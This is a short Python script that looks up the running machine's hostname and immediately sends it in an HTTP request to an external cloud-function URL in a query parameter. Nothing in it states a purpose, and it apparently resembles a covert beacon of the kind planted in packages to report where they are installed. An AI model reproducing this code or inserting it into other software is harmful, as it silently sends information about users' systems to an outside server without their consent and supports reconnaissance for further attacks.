import urllib.request
def getHostname():
    import socket
    # method one
    name = socket.gethostname()
    return name
hostname = getHostname()
url ="http://webapi-elbltfikkm.cn-shanghai.fcapp.run/?h="+hostname
http = urllib.request.urlopen(url)